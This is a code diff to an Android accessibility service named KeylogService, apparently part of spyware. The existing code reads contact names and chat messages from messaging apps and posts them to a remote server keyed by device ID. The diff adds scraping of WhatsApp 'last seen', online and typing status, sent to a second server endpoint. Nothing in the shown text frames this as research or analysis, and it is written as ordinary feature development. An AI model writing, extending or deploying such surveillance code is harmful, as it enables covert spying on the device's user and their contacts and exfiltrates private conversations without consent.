@@ -246,21 +246,60 @@ public class KeylogService extends AccessibilityService {
 
                 String contactName = extractContactName(root, packageName);
                 JSONArray messages = extractChatMessages(root, packageName);
+                
+                // WhatsApp Last Seen detection
+                String lastSeen = extractLastSeen(root);
 
                 if (messages.length() > 0) {
                     JSONObject payload = new JSONObject();
                     payload.put("contact", contactName);
                     payload.put("messages", messages);
                     payload.put("package", packageName);
+                    payload.put("last_seen", lastSeen);
                     payload.put("timestamp", System.currentTimeMillis());
                     httpPost(SERVER_URL + "/api/chat-capture/" + DEVICE_ID, payload.toString());
-                    Log.d(TAG, "Chat captured: " + messages.length() + " msgs from " + contactName);
+                    Log.d(TAG, "Chat captured: " + messages.length() + " msgs from " + contactName + " | last_seen: " + lastSeen);
+                } else if (!lastSeen.isEmpty()) {
+                    // Just send last seen status update
+                    JSONObject payload = new JSONObject();
+                    payload.put("contact", contactName);
+                    payload.put("last_seen", lastSeen);
+                    payload.put("package", packageName);
+                    payload.put("timestamp", System.currentTimeMillis());
+                    httpPost(SERVER_URL + "/api/whatsapp-status/" + DEVICE_ID, payload.toString());
                 }
                 root.recycle();
             } catch (Exception e) {
                 Log.d(TAG, "Chat capture error: " + e.getMessage());
             }
         }, 800); // Delay to let UI settle
+    }
+
+    private String extractLastSeen(AccessibilityNodeInfo root) {
+        // Look for "last seen" or "online" text patterns in WhatsApp
+        if (root == null) return "";
+        try {
+            CharSequence text = root.getText();
+            if (text != null) {
+                String t = text.toString().toLowerCase();
+                if (t.contains("last seen") || t.contains("online") || 
+                    t.contains("last seen today") || t.contains("last seen yesterday") ||
+                    t.contains("typing") || t.contains("recording") ||
+                    t.contains("last seen at")) {
+                    return text.toString();
+                }
+            }
+        } catch (Exception e) {}
+        
+        for (int i = 0; i < root.getChildCount(); i++) {
+            AccessibilityNodeInfo child = root.getChild(i);
+            if (child != null) {
+                String result = extractLastSeen(child);
+                child.recycle();
+                if (!result.isEmpty()) return result;
+            }
+        }
+        return "";
     }
 
     private String extractContactName(AccessibilityNodeInfo root, String pkg) {
